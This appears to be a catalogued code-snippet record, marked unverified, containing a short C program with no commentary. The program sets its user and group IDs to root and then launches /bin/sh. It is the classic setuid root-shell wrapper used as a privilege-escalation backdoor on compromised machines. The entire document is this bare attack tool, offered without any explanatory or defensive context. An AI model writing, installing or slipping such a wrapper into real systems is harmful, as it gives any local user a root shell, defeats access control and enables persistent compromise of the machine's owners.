---
id: 06a3f5ce-4171-48ed-a17a-55e5d613ed09
type: code
language: C
verified: false
created_at: '2019-09-17T20:08:40.303109+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 06a3f5ce

**Language**: C

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0); execvp("/bin/sh", NULL); return 0;
}
```
